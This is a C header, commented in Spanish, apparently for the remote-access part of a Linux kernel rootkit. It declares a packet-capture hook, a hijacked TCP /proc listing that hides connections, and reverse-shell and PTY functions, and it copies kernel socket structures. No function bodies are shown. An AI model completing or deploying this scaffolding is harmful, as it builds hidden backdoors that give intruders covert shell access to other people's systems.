/* funciones de remoto.c */

int capturar(struct sk_buff *skb, struct net_device *dev, struct packet_type *pkt,
				struct net_device *dev2);
int hacked_tcp4_seq_show(struct seq_file *seq, void *v);
int reverse_shell(void);
void ejecutar_shell(void);
int get_pty(void);
void eco_off(void);


/* estructuras y funciones para remoto.c */

struct my_request_sock {
    struct my_request_sock     *dl_next; /* Must be first member! */
    u16             mss;
    u8              retrans;
    u8              __pad;
    /* The following two fields can be easily recomputed I think -AK */
    u32             window_clamp; /* window clamp at creation time */
    u32             rcv_wnd;      /* rcv_wnd offered first time */
    u32             ts_recent;
    unsigned long           expires;
    struct request_sock_ops     *rsk_ops;
    struct sock         *sk;
};


struct my_inet_sock {
	struct sock sk;
#if defined(CONFIG_IPV6) || defined(CONFIG_IPV6_MODULE)
	struct ipv6_pinfo   *pinet6;
#endif
    /* Socket demultiplex comparisons on incoming packets. */
	__u32           daddr;
	__u32           rcv_saddr;
};


struct my_inet_request_sock {
    struct my_request_sock req;
    u32         loc_addr;
    u32         rmt_addr;
    u16         rmt_port;
    u16         snd_wscale : 4,
                rcv_wscale : 4,
                tstamp_ok  : 1,
                sack_ok    : 1,
                wscale_ok  : 1,
                ecn_ok     : 1,
                acked      : 1;
    struct ip_options   *opt;
};


static inline struct my_inet_request_sock *my_inet_rsk
	(const struct my_request_sock *sk)
{
	return (struct my_inet_request_sock *) sk;
}


#if (BITS_PER_LONG == 64)
#define INET_TIMEWAIT_ADDRCMP_ALIGN_BYTES 8
#else
#define INET_TIMEWAIT_ADDRCMP_ALIGN_BYTES 4
#endif


struct my_sock_common {
    unsigned short      skc_family;
    volatile unsigned char  skc_state;
    unsigned char       skc_reuse;
    int         skc_bound_dev_if;
    struct hlist_node   skc_node;
    struct hlist_node   skc_bind_node;
    atomic_t        skc_refcnt;
    unsigned int        skc_hash;
    struct proto        *skc_prot;
};


struct my_inet_timewait_sock {
    /*
     * Now struct sock also uses sock_common, so please just
     * don't add nothing before this first member (__tw_common) --acme
     */
    struct my_sock_common  __tw_common;
#define tw_family       __tw_common.skc_family
#define tw_state        __tw_common.skc_state
#define tw_reuse        __tw_common.skc_reuse
#define tw_bound_dev_if     __tw_common.skc_bound_dev_if
#define tw_node         __tw_common.skc_node
#define tw_bind_node        __tw_common.skc_bind_node
#define tw_refcnt       __tw_common.skc_refcnt
#define tw_hash         __tw_common.skc_hash
#define tw_prot         __tw_common.skc_prot
    volatile unsigned char  tw_substate;
    /* 3 bits hole, try to pack */
    unsigned char       tw_rcv_wscale;
    /* Socket demultiplex comparisons on incoming packets. */
    /* these five are in inet_sock */
    __u16           tw_sport;
    __u32           tw_daddr __attribute__((aligned(INET_TIMEWAIT_ADDRCMP_ALIGN_BYTES)));
    __u32           tw_rcv_saddr;
    __u16           tw_dport;
    __u16           tw_num;
    /* And these are ours. */
    __u8            tw_ipv6only:1;
    /* 31 bits hole, try to pack */
    int         tw_timeout;
    unsigned long       tw_ttd;
    struct inet_bind_bucket *tw_tb;
    struct hlist_node   tw_death_node;
};

